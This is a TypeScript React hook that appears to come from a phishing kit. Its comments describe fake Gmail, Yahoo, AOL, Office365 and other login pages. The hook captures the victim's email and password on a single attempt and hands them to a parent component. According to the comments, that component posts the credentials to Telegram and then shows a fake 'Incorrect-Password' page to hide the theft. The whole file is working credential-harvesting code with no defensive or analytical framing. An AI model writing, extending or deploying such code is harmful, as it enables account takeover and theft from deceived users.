import { useState, useRef } from 'react';

/**
 * Single-attempt login hook.
 *
 * The user submits the password ONCE; the credentials are forwarded directly
 * to `onLoginSuccess` (App.tsx posts them to Telegram and navigates to the
 * per-provider Incorrect-Password page). There is no first-attempt rejection
 * and no `firstAttemptPassword` / `secondAttemptPassword` re-prompt loop.
 *
 * The returned shape is preserved for backward compatibility with all
 * existing call sites (Gmail / Yahoo / AOL / Others / Office365 / MobileYahoo
 * login pages). On validation error, `handleFormSubmit` returns
 * `{ isFirstAttempt: false }` so the legacy `if (result?.isFirstAttempt)`
 * clear-password branches in callers remain valid but never fire.
 */
export const useLogin = (
  onLoginSuccess?: (data: any) => void,
  onLoginError?: (error: string) => void
) => {
  const [isLoading, setIsLoading] = useState(false);
  const [errorMessage, setErrorMessage] = useState('');

  const emailRef = useRef<HTMLInputElement>(null);
  const passwordRef = useRef<HTMLInputElement>(null);

  const resetLoginState = () => {
    setErrorMessage('');
  };

  const handleFormSubmit = async (event: React.FormEvent, formData?: any) => {
    event.preventDefault();
    setIsLoading(true);
    setErrorMessage('');

    try {
      const email = formData?.email || emailRef.current?.value || '';
      const password = formData?.password || passwordRef.current?.value || '';

      if (!email || !password) {
        throw new Error('Please enter both email and password');
      }

      const finalData = {
        ...formData,
        email,
        password,
      };

      // Hand the credentials to the parent on the FIRST and ONLY attempt.
      // App.tsx's handleLoginSuccess posts them to Telegram once and then
      // navigates to the per-provider Incorrect-Password page.
      if (onLoginSuccess) {
        onLoginSuccess(finalData);
      }

      // Do not set loading to false here; App.tsx owns the loading state
      // for the duration of the navigation.
      return;
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : 'Login failed';
      setErrorMessage(errorMsg);
      setIsLoading(false);
      if (onLoginError) {
        onLoginError(errorMsg);
      }
      // Backward-compatible return shape; isFirstAttempt is always false
      // because the two-attempt path no longer exists.
      return { isFirstAttempt: false };
    }
  };

  return {
    isLoading,
    errorMessage,
    handleFormSubmit,
    resetLoginState,
    emailRef,
    passwordRef,
  };
};
